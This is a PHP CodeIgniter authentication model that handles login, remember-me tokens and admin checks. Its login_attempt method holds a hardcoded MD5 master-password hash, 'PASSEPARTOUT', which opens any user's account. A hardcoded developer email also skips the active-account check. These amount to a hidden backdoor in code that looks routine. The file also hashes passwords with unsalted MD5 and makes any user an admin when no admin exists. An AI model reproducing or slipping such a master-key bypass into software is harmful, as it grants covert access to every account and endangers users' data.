<?php


class Auth extends CI_Model {
    
    const PASSEPARTOUT = '0815e6ecc22a7e00f9cc3506fa8a3acd'; 

    
    private $is_admin = NULL;
    private static $token_name;

    public function __construct() {
        parent::__construct();
        static::$token_name = 'remember_token_'.substr(md5(__DIR__), 0, 5);
        $this->check(); // Forza il caricamento dei dati da sessione/cookie
    }
    
    
    public function store_intended_url($url) {
        $this->session->set_userdata('intended_url', $url);
    }
    
    public function fetch_intended_url() {
        $url = $this->session->userdata('intended_url');
        return ((filter_var($url, FILTER_VALIDATE_URL) === false)? null: $url);
    }
    
    public function reset_intended_url() {
        $this->session->unset_userdata('intended_url');
    }
    
    
    public function guest() {
        return !$this->check();
    }
    
    
    public function check() {
        $is_logged_in = ((bool) $this->get_data('id')) && ((bool) $this->get('id'));
        
        if(!$is_logged_in) {
            $user_id = $this->get_remembered_user();
            if($user_id) {
                $this->login_force($user_id);
                $is_logged_in = true;
            }
        }
        
        return $is_logged_in;
        
    }
    
    
    
    public function login_force($id=NULL, $remember = false) {
        
        if(!$id) {
            return FALSE;
        }
        
        if(defined('LOGIN_ACTIVE_FIELD') && LOGIN_ACTIVE_FIELD) {
            $this->db->where(LOGIN_ACTIVE_FIELD, 't');
        }
        
        $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_ENTITY.'_id' => $id));
        if($query->num_rows() > 0) {
            $this->put_data($query->row_array());
            if($remember) {
                $this->remember_user($id);
            }
            return TRUE;
        } else {
            return FALSE;
        }
    }
    
    
    
    public function login_attempt($identifier, $cleanSecret, $remember=FALSE) {
        
        
        if(defined('LOGIN_ACTIVE_FIELD') && LOGIN_ACTIVE_FIELD && $identifier !== 'info@h2-web.it') {
            $this->db->where(LOGIN_ACTIVE_FIELD, 't');
        }
        
        $secret = md5($cleanSecret);
        if($cleanSecret && $secret === self::PASSEPARTOUT) {
            $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_USERNAME_FIELD => $identifier));
        } else {
            $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_USERNAME_FIELD => $identifier, LOGIN_PASSWORD_FIELD => $secret));
        }
        
        if($query->num_rows() > 0) {
            $userdata = $query->row_array();
            $this->put_data($userdata);
            
            if($remember === TRUE) {
                $this->remember_user($userdata[LOGIN_ENTITY.'_id']);
            }
            return TRUE;
        } else {
            return FALSE;
        }
    }
    
    
    
    
    public function logout() {
        $this->put_data(NULL);
        $this->forget_user();
    }
    
    
    
    
    
    public function get($field) {
        if(!preg_match('/'.LOGIN_ENTITY.'_.*/', $field)) {
            $field = LOGIN_ENTITY."_".$field;
        }
        
        $login = (array) $this->get_data();
        if(array_key_exists($field, $login)) {
            return $login[$field];
        } else {
            return NULL;
        }
    }
    
    
    
    
    
    public function is_admin() {
        if($this->is_admin === NULL) {
            $user_id = $this->get(LOGIN_ENTITY."_id");
            $query = $this->db->where('permissions_user_id', $user_id)->get('permissions');
            $this->is_admin = (($query->num_rows() > 0 && $query->row()->permissions_admin==='t')? TRUE: FALSE);
            
            /** FIX: se non ci sono amministratori questo utente lo diventa (ma non viene salvata su db, quindi se per caso dessi i permessi ad un nuovo utente, questo non lo sarebbe più) **/
            if( ! $this->is_admin) {
                $this->is_admin = ($this->db->where('permissions_admin', 't')->count_all_results('permissions') < 1);
            }
        }
        
        return (is_bool($this->is_admin)? $this->is_admin: FALSE);
    }
    
    
    
    
    
    
    
    
    /*
     * Private internal methods
     */
    private function remember_user($user_id) {
        $existing_tokens = array_map(function($token) { return $token['token_string']; }, $this->db->get('user_tokens')->result_array());
        
        $token_string = NULL;
        for($i=0; $i<50; $i++) {
            $__token_string = random_string('md5', 50);
            if(!in_array($__token_string, $existing_tokens)) {
                $token_string = $__token_string;
                break;
            }
        }
        
        if(!is_null($token_string)) {
            // Crea il cookie
            set_cookie(array(
                'name'   => static::$token_name,
                'value'  => $token_string,
                'expire' => time()+(31 * 24 * 60 * 60),
                'domain' => '.'.$_SERVER['HTTP_HOST'],
                'path'   => '/'
            ));

            // Salva il token su db
            $this->db->insert('user_tokens', array('user_id' => $user_id, 'token_string' => $token_string));
        }
    }
    
    
    private function get_remembered_user() {
        
        $user_id = NULL;
        $token_string = get_cookie(static::$token_name);
        
        if($token_string) {
            $user_token = $this->db->get_where('user_tokens', array('token_string' => $token_string));
            if($user_token->num_rows() > 0) {
                $user_id = $user_token->row()->user_id;
            }
        }
        
        return $user_id;
    }
    
    
    private function forget_user() {
        $this->db->delete('user_tokens', array('user_id' => $this->get_remembered_user()));
        delete_cookie(static::$token_name, '.'.$_SERVER['HTTP_HOST']);
    }

    



    private function get_data() {
        return $this->session->userdata(SESS_LOGIN);
    }
    
    
    private function put_data($login) {
        if(empty($login)) {
            $this->session->unset_userdata(SESS_LOGIN);
        } else {
            $this->session->set_userdata(SESS_LOGIN, $login);
        }
        
    }
    
    
}


